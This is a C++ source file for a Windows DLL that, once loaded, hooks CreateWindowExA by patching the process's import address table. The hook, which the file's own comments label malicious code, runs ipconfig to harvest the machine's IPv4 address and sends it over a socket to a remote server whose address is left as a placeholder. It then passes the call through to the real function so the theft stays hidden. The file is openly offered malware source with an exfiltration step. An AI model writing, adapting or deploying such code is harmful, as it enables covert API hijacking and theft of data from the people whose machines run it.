#include <iostream>
#include <Windows.h>
#include <winternl.h>
#include <fstream>
#include <winsock2.h>
#include <unistd.h>

#define PORT 8080
#define IP_SERVER "000.0.0.0"// replace with your server IP address
using namespace std;


// define MessageBoxA prototype
using PrototypeCreateWindowExA = HWND (WINAPI *)(DWORD, LPCSTR, LPCSTR, DWORD, int, int, int, int, HWND, HMENU,
                                                 HINSTANCE, LPVOID);

// remember memory address of the original MessageBoxA routine
PrototypeCreateWindowExA originalCreateWindowExA = CreateWindowExA;

string getip() {
    string line;
    ifstream IPFile;
    int offset;
    char *search0 = "IPv4 Address. . . . . . . . . . . :";      // search pattern

    system("ipconfig > ip.txt");

    IPFile.open("ip.txt");
    if (IPFile.is_open()) {
        while (!IPFile.eof()) {
            getline(IPFile, line);
            if ((offset = line.find(search0, 0)) != string::npos) {
                //   IPv4 Address. . . . . . . . . . . : 1
                //1234567890123456789012345678901234567890
                line.erase(0, 39);
                cout << line << endl;
                IPFile.close();
            }
        }
    }
    return line;
}

// hooked function with malicious code that eventually calls the original MessageBoxA
HWND
hookedCreateWindowExA(DWORD dwExStyle, LPCSTR lpClassName, LPCSTR lpWindowName, DWORD dwStyle, int X, int Y, int nWidth,
                      int nHeight, HWND hWndParent, HMENU hMenu, HINSTANCE hInstance, LPVOID lpParam) {
    // malicious code , open a socket and send data to a remote server
    int status, valread, client_fd;
    struct sockaddr_in serv_addr;
    //get ip of this computer
    //char* ip = get_ip();

    string ip = getip();
    // Initialize Winsock
    WSADATA wsaData;
    if (WSAStartup(MAKEWORD(2, 2), &wsaData) != 0) {
        std::cerr << "Failed to initialize winsock." << std::endl;
        return NULL;
    }

    // Create a socket
    SOCKET clientSocket = socket(AF_INET, SOCK_STREAM, 0);
    if (clientSocket == INVALID_SOCKET) {
        std::cerr << "Failed to create socket." << std::endl;
        WSACleanup();
        return NULL;
    }

    // Specify server address and port
    sockaddr_in serverAddress{};
    serverAddress.sin_family = AF_INET;
    serverAddress.sin_port = htons(8080); // Replace with the desired port number
    serverAddress.sin_addr.s_addr = inet_addr(IP_SERVER); // Replace with the server's IP address

    // Connect to the server
    if (connect(clientSocket, reinterpret_cast<sockaddr *>(&serverAddress), sizeof(serverAddress)) == SOCKET_ERROR) {

        closesocket(clientSocket);
        WSACleanup();
        return NULL;
    }
    // Do your operations with the server here...
    // Send data to the server , send ip
    send(clientSocket, ip.c_str(), ip.length(), 0);

    // Cleanup
    closesocket(clientSocket);
    WSACleanup();

    return originalCreateWindowExA(dwExStyle, lpClassName, lpWindowName, dwStyle, X, Y, nWidth, nHeight, hWndParent,
                                   hMenu, hInstance, lpParam);
}

int hooking(char *nameOfAPI) {

    DWORD baseAddress = (DWORD) GetModuleHandle(NULL);
    PIMAGE_DOS_HEADER dosHeader = (PIMAGE_DOS_HEADER) baseAddress;
    PIMAGE_NT_HEADERS peHeader = (PIMAGE_NT_HEADERS) (baseAddress + (*dosHeader).e_lfanew);
    IMAGE_OPTIONAL_HEADER32 optionalHeader = (*peHeader).OptionalHeader;
    IMAGE_DATA_DIRECTORY importDirectory = (optionalHeader).DataDirectory[IMAGE_DIRECTORY_ENTRY_IMPORT];
    PIMAGE_IMPORT_DESCRIPTOR importDescriptor = (PIMAGE_IMPORT_DESCRIPTOR)
            (importDirectory.VirtualAddress + baseAddress);

    int i = 0;

    while (importDescriptor[i].Characteristics != 0) {
        PIMAGE_THUNK_DATA thunkINT = (PIMAGE_THUNK_DATA)
                (importDescriptor[i].OriginalFirstThunk + baseAddress);;
        PIMAGE_THUNK_DATA thunkIAT = (PIMAGE_THUNK_DATA)
                (importDescriptor[i].FirstThunk + baseAddress);

        DWORD CurrentProtect;
        PIMAGE_IMPORT_BY_NAME nameData;

        while ((*thunkINT).u1.AddressOfData != 0) {
            if (!((*thunkINT).u1.Ordinal & IMAGE_ORDINAL_FLAG)) {
                nameData = (PIMAGE_IMPORT_BY_NAME) ((*thunkINT).u1.AddressOfData + baseAddress);

                if (strcmp(nameOfAPI, (char *) (*nameData).Name) == 0) {
                    VirtualProtect(thunkIAT, 4096, PAGE_READWRITE, &CurrentProtect);
                    thunkIAT->u1.Function = reinterpret_cast<ULONGLONG>(&hookedCreateWindowExA);
                }
            }
            thunkINT++;
            thunkIAT++;
        }
        i++;
    }

    return TRUE;
}

INT APIENTRY DllMain(HMODULE hDLL, DWORD Reason, LPVOID Reserved) {

    char apiBuffer[] = "CreateWindowExA";
    switch (Reason) {
        case DLL_PROCESS_ATTACH:
            hooking(apiBuffer);
            break;
        case DLL_PROCESS_DETACH:

            break;
        case DLL_THREAD_ATTACH:

            break;
        case DLL_THREAD_DETACH:

            break;
    }

    return TRUE;
}
